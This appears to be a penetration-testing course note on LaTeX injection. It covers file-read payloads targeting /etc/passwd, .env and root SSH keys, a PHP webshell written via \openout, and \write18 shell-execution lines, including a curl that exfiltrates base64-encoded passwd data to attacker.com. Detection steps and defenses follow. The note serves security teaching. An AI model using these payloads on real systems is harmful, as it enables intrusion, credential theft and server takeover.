---
tags: [vapt, injection, advanced]
difficulty: advanced
module: "10 - Injection Attacks"
topic: "10.17 LaTeX Injection"
---

# 10.17 — LaTeX Injection

## What is LaTeX Injection?

LaTeX is a document preparation system. When apps generate PDFs or documents from user-supplied LaTeX content (academic papers, reports, mathematical notation), injecting LaTeX commands can lead to file read, command execution, and SSRF.

```
VULNERABLE SCENARIO:
  Academic platform: "Enter your equation: [USER_INPUT]"
  App runs: pdflatex equation.tex
  
  User enters: \input{/etc/passwd}
  → LaTeX reads /etc/passwd and includes it in the PDF!
```

---

## LaTeX Injection Payloads

```latex
% READ LOCAL FILES:
\input{/etc/passwd}           → reads and includes file content
\include{/etc/passwd}         → similar to input
\input{/var/www/html/.env}    → database credentials!
\input{/root/.ssh/id_rsa}     → root SSH private key!

% VERBATIM FILE READ (preserves formatting):
\verbatiminput{/etc/passwd}

% WRITE FILE:
\newwrite\outfile
\openout\outfile = /tmp/evil.php
\write\outfile{<?php system($_GET["cmd"]); ?>}
\closeout\outfile
% → Creates a PHP webshell!

% SHELL EXECUTION (requires --shell-escape or -shell-escape flag):
\immediate\write18{id > /tmp/output.txt}  % write18 = shell execution!
\write18{curl https://attacker.com/$(id)} % OOB command execution!

% IF --shell-escape ENABLED:
\input{|"id"}                  → pipe: execute id, include output!
\input{|"cat /etc/passwd"}     → include passwd
\input{|"curl https://attacker.com/$(cat /etc/passwd | base64)"}
```

---

## Detecting LaTeX Injection

```bash
# STEP 1: FIND LATEX INPUT FIELDS:
# Math equation editors, document generators, academic platforms
# Keywords: LaTeX, PDF generation, equation, formula

# STEP 2: TEST BASIC LATEX:
# Enter: $1+1=2$
# If PDF shows formatted math → LaTeX is being processed!

# STEP 3: TEST SPECIAL CHARS FOR ERRORS:
# Enter: \ } { $ ^ _
# Error? → LaTeX injection surface!

# STEP 4: TEST FILE INCLUSION:
# Enter: \input{/etc/passwd}
# Check PDF for /etc/passwd content

# STEP 5: TEST SHELL EXECUTION (if --shell-escape):
# Enter: \write18{curl https://your-interactsh.com}
# Check Interactsh for incoming request

# STEP 6: OOB DETECTION:
# Enter: \immediate\write18{curl https://your-interactsh.com}
# If Interactsh gets a request → --shell-escape enabled!
```

---

## LaTeX Special Characters

```
CHARACTERS WITH SPECIAL MEANING IN LATEX:
  # $ % ^ & _ { } ~ \
  
INJECTION RELEVANCE:
  \  = command prefix → \input, \write18, etc.
  {  } = command arguments
  $  = math mode start/end
  %  = comment (rest of line ignored)
  
IF THESE AREN'T ESCAPED → INJECTION POSSIBLE!
```

---

## Impact

```
SEVERITY DEPENDS ON CONFIGURATION:

WITHOUT --shell-escape:
  ✓ File read (any file readable by LaTeX process)
  ✓ Include /etc/passwd, web config, .env, SSH keys
  SEVERITY: High

WITH --shell-escape ENABLED:
  ✓ Arbitrary OS command execution (RCE!)
  ✓ Reverse shell
  ✓ Full server compromise
  SEVERITY: Critical

COMMON TARGETS:
  Online LaTeX editors (Overleaf-like platforms)
  Academic paper submission systems
  Certificate/document generation platforms
  Math notation in e-learning platforms
```

---

## Defense

```
PROTECTION:
  1. Never run pdflatex/xelatex with --shell-escape in production!
     This flag enables \write18 → arbitrary shell commands!
  
  2. Run LaTeX in sandboxed environment:
     Docker container with no internet access
     No access to sensitive files (mount minimal FS)
  
  3. Validate/sanitize LaTeX input:
     Block dangerous commands: \input, \include, \write18, \openout
     Use allowlist of safe LaTeX commands
  
  4. Use a LaTeX sandbox (restricted mode):
     pdflatex --restricted   ← disables many dangerous commands
     texlua (LuaTeX restricted mode)
  
  5. Run as unprivileged user with no access to sensitive files
  
  6. Use sanitize-tex packages or custom filters to strip dangerous commands
```

---

## Related Notes
- [[Module 08 - Command Injection]] — shell execution parallels
- [[16 - PDF Injection]] — PDF generation attacks
- [[09 - SSTI]] — template-based code injection
